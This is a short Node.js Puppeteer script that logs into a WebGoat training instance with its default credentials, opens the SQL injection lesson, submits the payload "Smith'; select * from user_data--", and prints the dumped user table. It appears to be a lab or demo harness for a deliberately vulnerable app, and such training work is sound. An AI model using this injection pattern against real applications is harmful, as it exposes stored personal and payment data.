const fs = require('fs');
let alb = fs.readFileSync('./alb.url', 'utf8').replace(/\n$/,'');

const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
    ]
  });
  const url = 'http://' + alb + '/WebGoat';
  let page = await browser.newPage();
  await page.setViewport({
    width: 1920,
    height: 1080
  });
  await page.goto(url);

  /* login */
  try {
    await page.click('#exampleInputEmail1');
    await page.keyboard.type('webgoat');
    await page.click('#exampleInputPassword1');
    await page.keyboard.type('webgoat');
    await page.click('#main-content > form > button');
    await page.waitForSelector('#menu-container > ul > li:nth-child(11) > a > span');
    console.log('logged in to ' + url);

  } catch (e) {
    console.log('unable to login to ' + url);
    process.exit(1);
  }

  /* navigate to lesson & inject */
  try{
    console.log('navigating to string SQLi lesson');
    await page.goto(url + '/start.mvc#attack/538385464/1100', {timeout: 0});
    console.log('resetting lesson...JIC');
    await page.click('#restart-lesson-button');
    const ACCOUNT_NAME = '#lessonContent > form > p > input[type="TEXT"]:nth-child(1)';
    await page.waitForSelector(ACCOUNT_NAME);
    await page.$eval(ACCOUNT_NAME, str => str.value='Smith\'; select * from user_data--');
    await page.click('#lessonContent > form > p > input[type="SUBMIT"]:nth-child(2)');
    console.log('injection submitted');
    const TGT = '#lessonContent > form > table';
    await page.waitForSelector(TGT);
    console.log('dumping credit card info:');
    let tbl = await page.$eval(TGT, tbl => tbl.innerText);
    console.log(tbl);
  } catch (e)
  {
    console.log('unable to inject: ' + e);
    console.log('usually this is due to Chromium headless crashing; please retry');
  }

  await browser.close();
})();
